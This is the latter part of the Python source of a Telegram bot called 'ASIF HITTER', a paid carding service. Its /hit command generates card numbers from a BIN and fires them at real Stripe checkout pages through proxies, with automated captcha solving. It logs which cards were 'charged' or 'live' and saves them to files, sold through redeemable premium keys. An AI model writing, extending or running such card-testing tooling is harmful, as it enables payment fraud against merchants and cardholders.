        st = await update.message.reply_text(f"{e('⏳')} Fetching...", parse_mode=ParseMode.HTML)
        ck = SC(ctx.args[0], proxy)
        if await ck.init():
            await st.edit_text(f"""{e('🌐')} <b>GATEWAY INFO</b>

{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('🏦')} <b>Site:</b> {h(ck.site_url or 'Unknown')}
{e('🔑')} <b>PK:</b> <code>{h(ck.pk[:30])}...</code>
{e('✅')} <b>Status:</b> LIVE""", parse_mode=ParseMode.HTML)
        else:
            await st.edit_text(f"{e('❌')} Failed. Check URL or proxy.", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"gate: {ex}")

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        adm = await is_admin(uid)
        prem = await is_premium(uid)
        
        if not prem and not adm:
            await update.message.reply_text(f"""{e('🚫')} <b>ACCESS DENIED</b>

{e('⛔')} Premium Required!
{e('🔑')} /redeem &lt;key&gt; to activate""", parse_mode=ParseMode.HTML)
            return
        
        if not adm:
            if not await check_rate_limit(uid, "hit", RATE_LIMIT_HITS_PER_HOUR):
                await update.message.reply_text(f"{e('⛔')} Rate limit: {RATE_LIMIT_HITS_PER_HOUR} hits/hour", parse_mode=ParseMode.HTML)
                return
        
        if len(ctx.args) < 2:
            await update.message.reply_text(f"{e('⚠️')} <code>/hit &lt;url&gt; &lt;bin&gt;</code>\n{e('💳')} <code>/hit https://... 37936303</code>", parse_mode=ParseMode.HTML)
            return
        
        url = ctx.args[0]
        bin_in = ctx.args[1]
        
        if not re.match(r'^[0-9]{6,8}$', bin_in):
            await update.message.reply_text(f"{e('❌')} Invalid BIN. Use 6-8 digits only.", parse_mode=ParseMode.HTML)
            return
        
        proxies = await get_user_proxies(uid)
        if not adm and not proxies:
            await update.message.reply_text(f"{e('❌')} No proxies! /addproxy", parse_mode=ParseMode.HTML)
            return
        
        proxy = random.choice(proxies) if proxies else None
        
        # Initialize hybrid captcha solver with FREE option enabled
        solver = HybridCaptchaSolver(CAPTCHA_API_KEY, use_browser=True)
        
        st = await update.message.reply_text(f"{e('🚀')} <b>Initializing...</b>", parse_mode=ParseMode.HTML)
        ck = SC(url, proxy, proxies)
        if not await ck.init():
            await st.edit_text(f"{e('❌')} <b>Failed!</b> Check URL or proxy.", parse_mode=ParseMode.HTML)
            await solver.close()
            return
        
        cards = [gen_card(bin_in) for _ in range(10)]
        charged = []
        live = []
        td_count = 0
        declined_count = 0
        hc_count = 0
        err_count = 0
        results = []
        
        sem = asyncio.Semaphore(3)
        async def process_card(card, idx):
            async with sem:
                try:
                    progress = f"""{e('🚀')} <b>STRIPE CHECKOUT HITTER</b>

{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> <code>{bin_in[:8]}xxxx</code>

{e('⏳')} <b>Processing:</b> {idx+1}/10
{e('🎯')} <code>{card['f']}</code>

{e('✅')} {len(charged)} | {e('🔵')} {len(live)} | {e('🟡')} {td_count} | {e('❌')} {declined_count}"""
                    await st.edit_text(progress, parse_mode=ParseMode.HTML)
                except:
                    pass
                
                r = await ck.charge_with_retry(card, solver)
                return r
        
        tasks = [process_card(card, i) for i, card in enumerate(cards)]
        raw_results = await asyncio.gather(*tasks)
        
        for r in raw_results:
            sts = r["st"]
            msg = r["msg"]
            full_card = r["card"]
            
            if sts == "CHARGED":
                charged.append(full_card)
                results.append((full_card, e('✅'), "Charged ✅", msg))
            elif sts == "LIVE":
                live.append(full_card)
                results.append((full_card, e('🔵'), "Live CVC Match", msg))
            elif sts == "3DS":
                td_count += 1
                results.append((full_card, e('🟡'), "3DS Required", msg))
            elif sts == "HCAPTCHA":
                hc_count += 1
                results.append((full_card, e('⛔'), "Captcha Required", msg))
            elif sts == "DECLINED":
                declined_count += 1
                results.append((full_card, e('❌'), "Declined ❌", msg))
            else:
                err_count += 1
                results.append((full_card, e('⚪'), "Error", msg))
        
        final = f"""{e('👑')} <b>STRIPE CHECKOUT HITTER</b> {e('👑')}

{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> <code>{bin_in[:8]}xxxx</code>

{separator('═',35)}

"""
        for card_full, status_emoji, status_text, response_msg in results:
            final += f"""
<b>CC:</b> <code>{card_full}</code>
<b>Status:</b> {status_emoji} {status_text}
<b>Response:</b> {h(response_msg[:100])}
{separator()}
"""
        
        final += f"""
{separator('═',35)}
{e('📊')} <b>SUMMARY:</b>
{e('✅')} Charged: <b>{len(charged)}</b>
{e('🔵')} Live: <b>{len(live)}</b>
{e('🟡')} 3DS: <b>{td_count}</b>
{e('❌')} Declined: <b>{declined_count}</b>
{e('⛔')} Captcha: <b>{hc_count}</b>
⚪ Error: <b>{err_count}</b>

{e('🏦')} <b>Site:</b> {h(ck.mer)} ({h(ck.site_url or 'N/A')})
{e('💰')} <b>Amount:</b> {h(ck.amt)}

❤️ <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
        
        if charged:
            async with aiofiles.open(f"{DATA_DIR}/charged.txt", "a", encoding="utf-8") as f:
                await f.write("\n".join(charged) + "\n")
        if live:
            async with aiofiles.open(f"{DATA_DIR}/live.txt", "a", encoding="utf-8") as f:
                await f.write("\n".join(live) + "\n")
        
        stats = await get_cached("stats")
        stats["total_hits"] = stats.get("total_hits", 0) + 1
        stats["charged"] = stats.get("charged", 0) + len(charged)
        stats["live"] = stats.get("live", 0) + len(live)
        stats["declined"] = stats.get("declined", 0) + declined_count
        await set_cached("stats", None, stats, STATS_FILE)
        
        if len(final) > 3900:
            parts = [final[i:i+3800] for i in range(0, len(final), 3800)]
            for idx, part in enumerate(parts):
                if idx == 0:
                    await st.edit_text(part, parse_mode=ParseMode.HTML)
                else:
                    await update.message.reply_text(part, parse_mode=ParseMode.HTML)
                    await asyncio.sleep(0.3)
        else:
            await st.edit_text(final, parse_mode=ParseMode.HTML)
        
        log_summary = f"""
{e('💳')} <b>HIT COMPLETED</b>
{e('👤')} User: <a href="tg://user?id={uid}">{h(update.effective_user.full_name)}</a>
{e('📦')} Merchant: {h(ck.mer)}
{e('💰')} Amount: {h(ck.amt)}
{e('📊')} Charged: {len(charged)} | Live: {len(live)} | Declined: {declined_count}
"""
        await log_to_channel(ctx, log_summary)
        
        await solver.close()
        
    except Exception as ex:
        logger.error(f"hit: {ex}")
        await update.message.reply_text(f"{e('❌')} Error: {str(ex)[:100]}")

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if await is_premium(uid):
            users = await get_cached("premium", "users", {})
            u = users.get(str(uid), {})
            await update.message.reply_text(f"""{e('⛔')} <b>ALREADY PREMIUM</b>

{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>""", parse_mode=ParseMode.HTML)
            return
        
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} <code>/redeem &lt;key&gt;</code>", parse_mode=ParseMode.HTML)
            return
        
        key = ctx.args[0]
        keys_data = await get_cached("keys", "keys", {})
        
        if key not in keys_data:
            await update.message.reply_text(f"{e('❌')} Invalid key!", parse_mode=ParseMode.HTML)
            return
        
        kdata = keys_data[key]
        
        if kdata.get("used", False):
            used_by = kdata.get("used_by", "unknown")
            await update.message.reply_text(f"{e('❌')} Key already redeemed by another user!", parse_mode=ParseMode.HTML)
            return
        
        hours = kdata.get("hours", kdata.get("days", 1) * 24)
        expiry = (datetime.now(timezone.utc) + timedelta(hours=hours)).isoformat()
        kdata["used"] = True
        kdata["used_by"] = uid
        kdata["used_at"] = datetime.now(timezone.utc).isoformat()
        await set_cached("keys", "keys", keys_data, KEYS_FILE)
        
        dur = f"{hours//24} day(s)" if hours >= 24 else f"{hours} hour(s)"
        premium_users = await get_cached("premium", "users", {})
        premium_users[str(uid)] = {
            "name": update.effective_user.full_name,
            "username": update.effective_user.username or "",
            "activated": datetime.now(timezone.utc).isoformat(),
            "expiry": expiry,
            "key": key,
            "plan": dur
        }
        await set_cached("premium", "users", premium_users, PREMIUM_FILE)
        
        await update.message.reply_text(f"""{e('🎉')} {e('🎉')} {e('🎉')}

{e('👑')} <b>PREMIUM ACTIVATED!</b>

{e('🔑')} Key: <code>{key}</code>
{e('⏱️')} Expires: <code>{expiry[:10]}</code>
{e('💎')} Plan: <code>{dur}</code>

{e('🚀')} Use /hit now!""", parse_mode=ParseMode.HTML)
        
        await log_to_channel(ctx, f"{e('🔑')} <b>KEY REDEEMED</b>\n{e('👤')} {h(update.effective_user.full_name)}\n{e('🔑')} <code>{key}</code>\n{e('⏱️')} {dur}")
        
    except Exception as ex:
        logger.error(f"redeem: {ex}")

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if await is_admin(uid):
            await update.message.reply_text(f"""{e('⚡')} {e('👑')} <b>ADMIN</b>

{e('🔐')} Permanent access granted""", parse_mode=ParseMode.HTML)
        elif await is_premium(uid):
            users = await get_cached("premium", "users", {})
            u = users.get(str(uid), {})
            await update.message.reply_text(f"""{e('👑')} <b>PREMIUM</b>

{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>
{e('💎')} Plan: <code>{u.get('plan','?')}</code>""", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"""{e('⛔')} <b>FREE</b>

{e('🔑')} /redeem &lt;key&gt;""", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"status: {ex}")

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not await is_admin(update.effective_user.id):
            return
        
        if len(ctx.args) < 3:
            await update.message.reply_text(f"{e('⚠️')} <code>/genkey 10 24 hour</code>\n{e('ℹ️')} Units: hour, day, month", parse_mode=ParseMode.HTML)
            return
        
        count = int(ctx.args[0])
        value = int(ctx.args[1])
        unit = ctx.args[2].lower()
        
        if unit in ("hour", "hours", "h"):
            hours = value
        elif unit in ("day", "days", "d"):
            hours = value * 24
        elif unit in ("month", "months", "m"):
            hours = value * 24 * 30
        else:
            await update.message.reply_text(f"{e('❌')} Invalid unit. Use: hour, day, month", parse_mode=ParseMode.HTML)
            return
        
        if count > 100:
            await update.message.reply_text(f"{e('❌')} Max 100 keys per batch", parse_mode=ParseMode.HTML)
            return
        
        keys_data = await get_cached("keys", "keys", {})
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        new_keys = []
        
        for _ in range(count):
            k = f"ASIF-{''.join(random.choices(chars, k=20))}"
            while k in keys_data:
                k = f"ASIF-{''.join(random.choices(chars, k=20))}"
            keys_data[k] = {
                "hours": hours,
                "used": False,
                "used_by": None,
                "created": datetime.now(timezone.utc).isoformat()
            }
            new_keys.append(k)
        
        await set_cached("keys", "keys", keys_data, KEYS_FILE)
        
        dur = f"{hours}h" if hours < 24 else f"{hours//24}d"
        txt = f"{e('🎁')} <b>KEYS</b> ({count}x {dur})\n\n" + "\n".join([f"<code>{k}</code>" for k in new_keys])
        
        if len(new_keys) > 15:
            await update.message.reply_document(
                InputFile(StringIO("\n".join(new_keys)), filename="keys.txt"),
                caption=f"{count} keys ({dur})"
            )
        else:
            await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
        
        await log_to_channel(ctx, f"{e('🎁')} <b>KEYS GENERATED</b>\nCount: {count}\nDuration: {dur}")
        
    except Exception as ex:
        logger.error(f"genkey: {ex}")

async def cmd_premium_list(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not await is_admin(update.effective_user.id):
            return
        users = await get_cached("premium", "users", {})
        if not users:
            await update.message.reply_text(f"{e('❌')} No users", parse_mode=ParseMode.HTML)
            return
        txt = f"{e('👑')} <b>PREMIUM USERS ({len(users)})</b>\n\n"
        for uid, u in users.items():
            try:
                exp = datetime.fromisoformat(u.get("expiry", "2000-01-01"))
                if exp.tzinfo is None:
                    exp = exp.replace(tzinfo=timezone.utc)
                status = e('🟢') if datetime.now(timezone.utc) < exp else e('🔴')
                txt += f"{status} <a href=\"tg://user?id={uid}\">{h(u.get('name','?'))}</a>\n   {e('⏱️')} {u.get('expiry','?')[:10]} | {e('💎')} {u.get('plan','?')}\n\n"
            except:
                pass
        await update.message.reply_text(txt[:4000], parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"premium: {ex}")

async def cmd_rmsub(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not await is_admin(update.effective_user.id):
            return
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} /rmsub &lt;user_id&gt;", parse_mode=ParseMode.HTML)
            return
        uid = ctx.args[0]
        users = await get_cached("premium", "users", {})
        if uid in users:
            del users[uid]
            await set_cached("premium", "users", users, PREMIUM_FILE)
            await update.message.reply_text(f"{e('✅')} Removed", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"{e('❌')} Not found", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"rmsub: {ex}")

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not await is_admin(update.effective_user.id):
            return
        msg = update.message.text.replace("/broadcast", "", 1).strip()
        if not msg:
            await update.message.reply_text(f"{e('⚠️')} /broadcast &lt;msg&gt;", parse_mode=ParseMode.HTML)
            return
        users = await get_cached("premium", "users", {})
        sent = 0
        for uid in users:
            try:
                await ctx.bot.send_message(int(uid), f"{e('📢')} <b>BROADCAST</b>\n\n{msg}", parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await update.message.reply_text(f"{e('✅')} Sent: {sent}", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"broadcast: {ex}")

async def cmd_sethits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not await is_admin(update.effective_user.id):
            return
        if ctx.args:
            settings = await get_cached("settings")
            settings["log_channel"] = ctx.args[0]
            await set_cached("settings", None, settings, SETTINGS_FILE)
            await update.message.reply_text(f"{e('✅')} Log channel: {h(ctx.args[0])}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"{e('ℹ️')} /sethits @channel", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"sethits: {ex}")

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        q = update.callback_query
        await q.answer()
        d = q.data
        uid = q.from_user.id
        
        if d == "gate_help":
            await q.message.reply_text(f"{e('🌐')} <b>Gateway</b>\n<code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
        elif d == "hit_help":
            await q.message.reply_text(f"{e('💳')} <b>Hit</b>\n<code>/hit &lt;url&gt; &lt;bin&gt;</code>\n{e('ℹ️')} BIN must be 6-8 digits", parse_mode=ParseMode.HTML)
        elif d == "redeem_help":
            await q.message.reply_text(f"{e('🔑')} <b>Redeem</b>\n<code>/redeem &lt;key&gt;</code>\n{e('ℹ️')} Each key works for ONE user only", parse_mode=ParseMode.HTML)
        elif d == "status":
            await cmd_status(update, ctx)
        elif d == "proxy_menu":
            await q.message.reply_text(f"{e('🔐')} <b>Proxy</b>\n/addproxy | /proxy | /rmproxy", parse_mode=ParseMode.HTML)
        elif d == "stats_view":
            stats = await get_cached("stats")
            await q.message.reply_text(f"""{e('📊')} <b>GLOBAL STATS</b>

{e('🎯')} Hits: <b>{stats.get('total_hits',0)}</b>
{e('✅')} Charged: <b>{stats.get('charged',0)}</b>
{e('🔵')} Live: <b>{stats.get('live',0)}</b>
{e('❌')} Declined: <b>{stats.get('declined',0)}</b>""", parse_mode=ParseMode.HTML)
        elif d == "admin_panel" and await is_admin(uid):
            await q.message.reply_text(f"""{e('⚡')} <b>ADMIN PANEL</b>

/genkey 10 24 hour
/premium
/rmsub
/broadcast
/sethits""", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"callback: {ex}")

# ═══════════════════════════ MAIN ═══════════════════════════
def main():
    os.makedirs(DATA_DIR, exist_ok=True)
    
    app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
    app.add_error_handler(error_handler)
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("gate", cmd_gate))
    app.add_handler(CommandHandler("hit", cmd_hit))
    app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("auth", cmd_redeem))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("premium", cmd_premium_list))
    app.add_handler(CommandHandler("rmsub", cmd_rmsub))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("sethits", cmd_sethits))
    app.add_handler(CallbackQueryHandler(on_callback))
    
    logger.info(f"{e('✅')} ASIF HITTER v5.3 PRO RUNNING!")
    logger.info(f"{e('📡')} Captcha solver: 2Captcha + FREE Browser (No API Key Required)")
    logger.info(f"{e('🎉')} Premium Animated Emojis ENABLED!")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True, close_loop=False)

if __name__ == "__main__":
    main()
